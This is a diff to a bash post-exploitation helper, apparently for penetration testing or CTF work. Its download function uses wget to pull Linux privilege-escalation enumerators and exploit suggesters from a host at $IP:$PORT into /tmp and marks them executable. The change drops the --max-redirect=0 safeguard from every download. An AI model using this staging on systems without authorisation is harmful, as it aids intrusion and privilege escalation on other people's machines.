@@ -162,7 +162,7 @@ function download () {
 
 		# Download first file, check for wget success code, exit if it failed
 		echo -e "${GREEN}[*] Downloading enumeration scripts to /tmp!${NC}";
-		wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/lse.sh" -O "$DIR"/lse.sh;
+		wget -nv -t 2 "http://$IP:$PORT/lse.sh" -O "$DIR"/lse.sh;
 		RETURN=$?;
 
 		if [[ "$RETURN" -ne 0 ]]; then
@@ -170,21 +170,21 @@ function download () {
 				exit 1;
 		else
 				chmod +x "$DIR"/lse.sh;
-				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linenum.sh" -O "$DIR"/linenum.sh;
+				wget -nv -t 2 "http://$IP:$PORT/linenum.sh" -O "$DIR"/linenum.sh;
 				chmod +x "$DIR"/linenum.sh;
-				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/linuxprivchecker.py" -O "$DIR"/linuxprivchecker.py;
+				wget -nv -t 2 "http://$IP:$PORT/linuxprivchecker.py" -O "$DIR"/linuxprivchecker.py;
 				chmod +x "$DIR"/linuxprivchecker.py;
-				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/uptux.py" -O "$DIR"/uptux.py;
+				wget -nv -t 2 "http://$IP:$PORT/uptux.py" -O "$DIR"/uptux.py;
 				chmod +x "$DIR"/uptux.py;
-				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/suid3num.py" -O "$DIR"/suid3num.py;
+				wget -nv -t 2 "http://$IP:$PORT/suid3num.py" -O "$DIR"/suid3num.py;
 				chmod +x "$DIR"/suid3num.py;
 
 				# exploit suggestion tools
-				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les.sh" -O "$DIR"/les.sh;
+				wget -nv -t 2 "http://$IP:$PORT/les.sh" -O "$DIR"/les.sh;
 				chmod +x "$DIR"/les.sh;
-				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/les-soft.py" -O "$DIR"/les-soft.py;
+				wget -nv -t 2 "http://$IP:$PORT/les-soft.py" -O "$DIR"/les-soft.py;
 				chmod +x "$DIR"/les-soft.py;
-				wget --max-redirect=0 -nv -t 2 "http://$IP:$PORT/files_exploits.csv" -O "$DIR"/files_exploits.csv;
+				wget -nv -t 2 "http://$IP:$PORT/files_exploits.csv" -O "$DIR"/files_exploits.csv;
 		fi
 }
 
